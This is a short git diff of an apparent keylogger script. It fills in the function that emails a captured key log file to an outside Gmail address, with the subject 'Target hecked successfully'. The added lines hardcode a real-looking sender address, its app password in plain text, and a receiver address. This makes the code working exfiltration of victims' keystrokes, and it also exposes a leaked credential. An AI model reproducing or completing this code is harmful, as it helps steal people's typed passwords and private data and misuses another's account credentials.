@@ -35,16 +35,16 @@ def send_email(sender_email, sender_password, receiver_email, subject, message, 
     server.sendmail(sender_email, receiver_email, msg.as_string())
     print("Email sent successfully.")
 
-def send_file():
-    sender_email = '...'        # your email address
+def send_file(path):
+    sender_email = 'hecker.heck504@gmail.com'        # your email address
     # email password: needs to be an app password since in 2022 google stopped less secure apps from using the general password
     # to setup an app password you need 2FA enabled
     # check out https://support.google.com/accounts/answer/185833?visit_id=638292779507737271-2677340316&p=InvalidSecondFactor&rd=1
-    sender_password = 'your app password'     
+    sender_password = 'gwgcbqjtiwjkllep'     
 
-    receiver_email = '...'  # recipient's email address
+    receiver_email = 'aozaoz2017@gmail.com'  # recipient's email address
     subject = 'Target hecked successfully'
     message = "I'm a genius hecker."
-    attachment_path = 'sus.txt'     # path to key log file
+    attachment_path = path     # path to key log file
 
     send_email(sender_email, sender_password, receiver_email, subject, message, attachment_path)
